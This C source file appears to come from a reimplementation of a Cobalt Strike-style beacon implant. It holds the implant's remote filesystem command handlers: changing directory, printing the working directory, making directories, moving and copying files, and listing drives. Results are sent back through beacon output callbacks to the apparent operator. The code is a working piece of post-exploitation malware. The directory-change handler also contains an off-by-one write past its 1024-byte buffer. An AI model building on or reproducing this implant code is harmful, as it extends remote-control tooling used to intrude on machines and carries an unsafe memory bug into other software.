#include "pch.h"

#include "filesystem.h"

#include "beacon.h"

void FilesystemCd(char* buffer, int length)
{
	char path[1024];

	if (length > sizeof(path))
		return;

	strncpy(path, buffer, length);
	path[length] = '\0';

	SetCurrentDirectoryA(path);
}

void FilesystemPwd()
{
	char data[2048];
	int length = GetCurrentDirectoryA(sizeof(data), data);
	if (length == 0)
		return;
	BeaconOutput(CALLBACK_PWD, data, length);
}

void FilesystemMkdir(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	char* path = BeaconDataStringPointerCopy(&parser, 0x4000);

	// Create the directory
	CreateDirectoryA(path, NULL);

	free(path);
}

void FilesystemMove(char* buffer, int length)
{
#define MAX_SRC 0x2000
#define MAX_DST 0x2000
	datap* locals = BeaconDataAlloc(MAX_SRC + MAX_DST);
	char* src = BeaconDataPtr(locals, MAX_SRC);
	char* dst = BeaconDataPtr(locals, MAX_DST);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	BeaconDataStringCopySafe(&parser, src, MAX_SRC);
	BeaconDataStringCopySafe(&parser, dst, MAX_DST);

	// Move the file
	if(!MoveFileA(src, dst))
	{
		DWORD lastError = GetLastError();
		LERROR("Move failed: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_MOVE_FAILED, lastError);
	}

	BeaconDataFree(locals);
}

void FilesystemCopy(char* buffer, int length)
{
#define MAX_EXISTING_FILENAME 0x2000
#define MAX_NEW_FILENAME 0x2000
	datap* locals = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
	char* existingFileName = BeaconDataPtr(locals, MAX_EXISTING_FILENAME);
	char* newFileName = BeaconDataPtr(locals, MAX_NEW_FILENAME);

	datap parser;
	BeaconDataParse(&parser, buffer, length);
	BeaconDataStringCopySafe(&parser, existingFileName, MAX_EXISTING_FILENAME);
	BeaconDataStringCopySafe(&parser, newFileName, MAX_NEW_FILENAME);

	// Copy the file
	if (!CopyFileA(existingFileName, newFileName, FALSE))
	{
		DWORD lastError = GetLastError();
		LERROR("Copy failed: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_COPY_FAILED, lastError);
	}

	BeaconDataFree(locals);
}

void FilesystemDrives(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	formatp locals;
	BeaconFormatAlloc(&locals, 128);

	int value = BeaconDataInt(&parser);
	BeaconFormatInt(&locals, value);

	int logicalDrives = GetLogicalDrives();
	BeaconFormatPrintf(&locals, "%u", logicalDrives);

	int size = BeaconFormatLength(&locals);
	char* data = BeaconFormatOriginal(&locals);
	BeaconOutput(CALLBACK_PENDING, data, size);

	BeaconFormatFree(&locals);
}